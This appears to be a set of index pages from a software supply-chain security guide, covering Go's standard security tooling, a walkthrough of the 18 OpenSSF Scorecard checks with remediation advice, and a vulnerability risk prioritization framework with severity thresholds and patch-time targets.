Security-focused tooling built into the Go ecosystem. No exotic tools needed. Everything is standard, integrated, and runs every commit.

> **Boring is Better**
>
> Go's "boring" standard tools catch real vulnerabilities because they're frictionless to run. Exotic tools gather dust. Standard tools run on every commit.
>

#### Contents

- **[Standard Toolkit](tools.md)** - Race detector, golangci-lint, gofmt, Trivy, govulncheck, syft, TruffleHog
- **[Workflow Integration](integration.md)** - Pre-commit hooks and CI pipeline configuration
- **[Compliance](compliance.md)** - OpenSSF Best Practices and Go Report Card alignment
- **[Conclusion](conclusion.md)** - Cost analysis, why this works, and related resources

---

*Boring tools. Run every commit. Catch real vulnerabilities. Zero cost. OpenSSF certified.*

## OpenSSF Scorecard Achievement Guide

Complete OpenSSF Scorecard achievement guide.

Comprehensive guide for understanding, interpreting, and improving OpenSSF Scorecard results. Covers all 18 checks, false positive handling, controversial check guidance, and remediation playbooks.

> **Start Here, Not with Scorecard**
>
>
> Don't chase a score. Build secure practices first, then measure them. High Scorecard scores are a byproduct of good security engineering, not the goal.
>

---

#### What is OpenSSF Scorecard?

OpenSSF Scorecard is an automated security tool that checks repositories for supply chain security best practices. It evaluates 18 different security checks and produces scores from 0 to 10 for each check.

**Why it matters:**

- **Compliance**: Required by some enterprise procurement processes and security questionnaires
- **Supply chain security**: Identifies real vulnerabilities in your development and release processes
- **Best practices enforcement**: Automated checks ensure security practices don't regress

**What it doesn't do:**

- Replace security audits or penetration testing
- Catch all vulnerabilities because heuristic-based checks have limitations
- Understand context because some failures may be intentional design choices

---

#### Quick Reference: All 18 Checks

| Check | Weight | Difficulty | Category | Quick Fix |
| ----- | ------ | ---------- | -------- | --------- |
| Binary-Artifacts | High | Easy | Supply Chain | Remove binaries from git |
| Branch-Protection | High | Medium | Code Review | Enable GitHub settings |
| CI-Tests | Low | Easy | Quality | Add test workflow |
| CII-Best-Practices | Low | High | Certification | Complete questionnaire |
| Code-Review | High | Medium | Code Review | Require PR reviews |
| Contributors | Low | N/A | Community | Encourage contributions |
| Dangerous-Workflow | High | Medium | Supply Chain | Fix workflow patterns |
| Dependency-Update-Tool | High | Easy | Dependencies | Enable Renovate/Dependabot |
| Fuzzing | Medium | High | Security | Integrate fuzzing |
| License | Low | Easy | Legal | Add LICENSE file |
| Maintained | Low | N/A | Activity | Regular commits |
| Packaging | Medium | Medium | Distribution | Publish packages |
| Pinned-Dependencies | High | Medium | Supply Chain | Pin to SHA digests |
| SAST | Medium | Easy | Security | Add static analysis |
| Security-Policy | Medium | Easy | Documentation | Add SECURITY.md |
| Signed-Releases | High | High | Supply Chain | SLSA provenance |
| Token-Permissions | High | Easy | Security | Job-level permissions |
| Vulnerabilities | High | Varies | Security | Fix known CVEs |

**Weight definitions:**

- **High**: Critical for supply chain security
- **Medium**: Important but not critical
- **Low**: Nice to have, signals project health

**Difficulty estimates:**

- **Easy**: 1 to 2 hours to fix
- **Medium**: Half day to implement
- **High**: Full day or more of work
- **N/A**: Not directly controllable

For detailed descriptions, see the check category guides linked below.

---

#### Check Categories

##### Supply Chain Security (6 checks)

The highest impact security checks that prevent supply chain attacks:

- **Binary-Artifacts**: Detects checked-in binaries that could hide malware
- **Dangerous-Workflow**: Identifies workflows that could leak secrets or execute untrusted code
- **Dependency-Update-Tool**: Ensures dependencies stay current with security patches
- **Pinned-Dependencies**: Prevents unexpected behavior from dependency updates
- **Signed-Releases**: Cryptographic proof that releases are authentic
- **Token-Permissions**: Limits blast radius of compromised workflows

**Priority**: Fix these first. They protect against real supply chain attacks.

##### Code Review & Quality (4 checks)

Checks that ensure code quality and review processes:

- **Branch-Protection**: Enforces review requirements and prevents force pushes
- **CI-Tests**: Verifies automated testing exists
- **Code-Review**: Ensures human review before merge
- **Contributors**: Measures community diversity

**Priority**: Medium. Important for code quality, less critical for security.

##### Security Practices (5 checks)

Active security tooling and policies:

- **Fuzzing**: Tests for unexpected input handling
- **SAST**: Static analysis security testing
- **Security-Policy**: Documented vulnerability reporting process
- **Vulnerabilities**: Known CVEs in dependencies
- **CII-Best-Practices**: Comprehensive security certification

**Priority**: High for Vulnerabilities, SAST, and Security-Policy. Medium for others.

##### Project Health (3 checks)

Signals about project maturity and maintenance:

- **License**: Legal clarity for users
- **Maintained**: Recent activity signals active maintenance
- **Packaging**: Distribution through package managers

**Priority**: Low for security, high for adoption.

---

#### Common Score Ranges

##### Score 7 to 8: Good Security Hygiene

**What you have:**

- Automated testing in CI
- Dependency scanning
- Basic branch protection
- Security policy documented

**What's missing:**

- SLSA provenance for releases
- Job-level token permissions
- Comprehensive dependency pinning

**Time to fix**: 4 to 8 hours focused work

**See**: [Stuck at 8: The Journey to 10/10](../../blog/posts/2025-12-18-scorecard-stuck-at-eight.md)

##### Score 8 to 9: Strong Security Posture

**What you have:**

- All checks from 7 to 8
- SLSA Level 3 provenance
- Job-level permissions
- SHA-pinned dependencies

**What's missing:**

- Perfect branch protection with 2+ reviewers and recent push approval
- Fuzzing integration
- CII Best Practices badge

**Time to fix**: 1 to 2 days

##### Score 9 to 10: Exceptional Security

**What you have:**

- All previous checks passing
- Comprehensive security controls
- Advanced tooling including fuzzing and SLSA
- Community certification

**What's left:**

- Edge cases and false positives
- Documented exceptions for controversial checks
- Continuous monitoring and maintenance

**Time to fix**: Ongoing maintenance

---

#### Detailed Guides

##### Getting Started

Start with these guides for quick wins and foundational understanding:

- **[Scorecard Compliance](scorecard-compliance.md)** - Core patterns: job-level permissions, dependency pinning, source archive signing
- **[Workflow Examples](scorecard-workflow-examples.md)** - Production-ready workflows for 10/10 compliance

##### Score Progression

Systematic approach to improving your score:

- **Score Progression Guide** *(Coming soon)* - Prioritized roadmap from 7 to 8 to 9 to 10

##### Check-Specific Playbooks

Deep dives on check categories:

- **Supply Chain Checks** *(Coming soon)* - Pinned-Dependencies, Dangerous-Workflow, Binary-Artifacts, SAST
- **Code Review Checks** *(Coming soon)* - Code-Review, Contributors, Maintained, Branch-Protection
- **Security Practices Checks** *(Coming soon)* - Security-Policy, CII-Best-Practices, Vulnerabilities, Fuzzing, Token-Permissions
- **Release Security Checks** *(Coming soon)* - Signed-Releases, Packaging, License

##### Advanced Topics

Navigate complexity and trade-offs:

- **False Positives Guide** *(Coming soon)* - Common false positive patterns and resolution approaches
- **Decision Framework** *(Coming soon)* - When to follow vs. deviate from Scorecard recommendations
- **CI/CD Integration** *(Coming soon)* - Automated Scorecard monitoring and regression prevention

---

#### False Positives and Limitations

Scorecard uses heuristics, not perfect knowledge. Common false positive scenarios:

##### Pinned-Dependencies Exceptions

**Issue**: Scorecard flags version tags for actions that **require** them.

**Examples**:

- `ossf/scorecard-action@v2.4.0` requires version tags for internal verification
- `slsa-framework/slsa-github-generator@v2.1.0` requires version tags for verifier validation

**Resolution**: Document the exception in Renovate config. These are legitimate deviations.

##### Branch-Protection Admin Bypass

**Issue**: Scorecard penalizes allowing admins to bypass protections.

**Context**: Small teams may need admin bypass for emergency fixes.

**Resolution**: Decide based on team size and risk tolerance. Document the decision.

##### Contributors Count

**Issue**: Solo-maintained projects can't increase contributor count.

**Context**: Single-maintainer projects are valid but flagged.

**Resolution**: Accept the score. Quality matters more than quantity.

---

#### Controversial Recommendations

Not all Scorecard recommendations fit all contexts. Common debates:

##### SHA Pinning vs. Semantic Versioning

**Scorecard position**: Pin everything to SHA digests.

**Counter-argument**: Version tags are more maintainable and Renovate handles updates.

**Our position**: SHA pin GitHub Actions for supply chain risk. Use version tags for dependencies with SemVer protection.

##### Two Reviewers for Small Teams

**Scorecard position**: Require 2+ reviewers on all PRs.

**Counter-argument**: Solo maintainers or two-person teams can't meet this.

**Our position**: Enable for teams of 3+. Document exception for smaller teams.

##### Fuzzing for All Projects

**Scorecard position**: All projects should have fuzzing.

**Counter-argument**: High implementation cost and low value for simple projects.

**Our position**: Prioritize for security-critical code such as parsers and crypto. Skip for CRUD apps.

---

#### Related Content

##### Blog Posts

Real-world Scorecard experiences:

- [OpenSSF Best Practices Badge in 2 Hours](../../blog/posts/2025-12-17-openssf-badge-two-hours.md) - Fast-track CII certification
- [Stuck at 8: The Journey to 10/10](../../blog/posts/2025-12-18-scorecard-stuck-at-eight.md) - SLSA provenance breakthrough

##### Related Guides

- [SLSA Provenance](../../enforce/slsa-provenance/slsa-provenance.md) - Build attestations for Signed-Releases 10/10
- [SBOM Generation](../sbom/sbom-generation.md) - Complete attestation stack
- [GitHub Apps](../github-apps/index.md) - Secure authentication patterns

---

#### Next Steps

1. **Run Scorecard**: Get your baseline score with `ossf/scorecard-action`
2. **Quick wins**: Fix Token-Permissions, add SECURITY.md, enable Dependabot
3. **Medium effort**: Implement SLSA provenance and pin dependencies to SHA
4. **High effort**: Add fuzzing, earn CII badge, perfect branch protection
5. **Maintenance**: Monitor score, prevent regressions, update as Scorecard evolves

**Remember**: Scorecard measures security practices. Don't game the score. Build secure systems.

---

*Scorecard is a tool, not a goal. Use it to find real security gaps, not to chase a number. The best score is the one that reflects actual security investment.*

## Risk Management

### Risk Prioritization Framework for Engineers

Making fast, defensible decisions about vulnerability remediation under pressure. This framework translates security metrics into actionable engineering decisions.

> **Key Insight**
>
> Risk = (Impact × Likelihood × Exploitability) - (Remediation Cost). Prioritize ruthlessly based on exposure, not noise.
>

#### Overview

Most teams have an unlimited list of vulnerabilities but finite resources. The difference between effective security and security theater is how you make triage decisions.

This framework gives you:

1. **Objective metrics** to compare disparate vulnerabilities
2. **Decision trees** for patch-now vs patch-later choices
3. **Cost-benefit analysis** for remediation tradeoffs
4. **Real-world examples** with concrete decisions

The goal: **Spend your security budget where exposure is highest**.

#### Framework Components

This framework is organized into focused modules:

##### [Risk Assessment Matrix](risk-assessment.md)

Establish baseline risk across three dimensions:

- Impact scoring (1-4 scale)
- Likelihood assessment
- Exploitability evaluation
- Risk score calculation and interpretation

##### [CVSS Score Interpretation](cvss-interpretation.md)

Translate CVSS scores to engineering decisions:

- CVSS 3.1 score ranges and thresholds
- Key components (Attack Vector, Complexity, Privileges)
- Real-world CVSS vector examples
- When CVSS doesn't tell the whole story

##### [Exploitability Analysis](exploitability-analysis.md)

Determine if vulnerability is actually weaponized:

- Exploit maturity spectrum
- Public exploit databases
- Tools for checking exploit status
- Timeline from PoC to active exploitation

##### [Blast Radius Calculation](blast-radius.md)

Calculate infrastructure impact:

- System coverage assessment
- Dependency mapping (direct and transitive)
- User and data exposure calculation
- Blast radius multipliers (0.2 to 5.0)

##### [Decision Trees](decision-trees.md)

Fast, repeatable decision frameworks:

- Patch now vs. later decision tree
- Mitigate vs. accept vs. transfer decision tree
- Emergency vs. standard patching workflow
- Implementation checklists

##### [Real-World Scenarios](real-world-scenarios.md)

Complete worked examples:

- Log4Shell (CVE-2021-44228)
- Node.js session vulnerability
- Kubernetes privilege escalation
- Transitive dependency challenges

##### [Remediation Cost Analysis](remediation-cost.md)

Balance risk vs. effort:

- Cost calculation framework
- Priority scoring
- Metrics to track (MTTD, MTBP)
- Implementation checklists

#### Quick Reference

##### Severity Thresholds

| Risk Score | Label | Action Timeline |
|-----------|-------|----------------|
| 45+ | **CRITICAL** | 24 hours |
| 30-44 | **HIGH** | 1 week |
| 15-29 | **MEDIUM** | 30 days |
| 5-14 | **LOW** | Next maintenance window |
| <5 | **MINIMAL** | Opportunistic |

##### Key Metrics

- **MTTD** (Mean Time to Detect): < 24 hours
- **MTBP** (Mean Time to Patch - Critical): < 4 hours
- **MTBP** (Mean Time to Patch - High): < 72 hours
- **MTBP** (Mean Time to Patch - Medium): < 30 days

#### References

- [CVSS Specification](https://www.first.org/cvss/v3.1/specification-document)
- [NVD CVE Database](https://nvd.nist.gov/vuln)
- [OWASP Risk Rating](https://owasp.org/www-community/OWASP_Risk_Rating_Methodology)
- [NIST Security Controls](https://csrc.nist.gov/pubs/sp/800/53/r5/upd1/final)

---

*Risk prioritization is a skill. Practice making fast, defensible decisions under pressure.*
